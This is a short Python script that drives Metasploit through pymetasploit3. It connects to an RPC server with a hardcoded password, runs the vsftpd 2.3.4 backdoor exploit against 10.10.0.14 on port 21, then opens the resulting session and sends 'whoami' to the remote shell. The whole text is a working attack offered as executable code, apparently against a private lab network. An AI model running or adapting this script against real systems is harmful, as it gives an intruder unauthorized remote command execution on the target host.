from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

a = MsfRpcClient('IFwJwgwC', port=55552)
exploit = a.modules.use('exploit', 'exploit/unix/ftp/vsftpd_234_backdoor')
print(exploit.options)
print(exploit.missing_required)

exploit["RHOSTS"] = "10.10.0.14"
exploit["RPORT"] = "21"
exploit['CHOST'] = '10.10.0.13'
exploit['CPORT'] = "4444"

print(exploit["RHOSTS"])

exploit.execute()

print(a.sessions.list)

shell = a.sessions.session('1')
shell.write('whoami')
print(shell.read())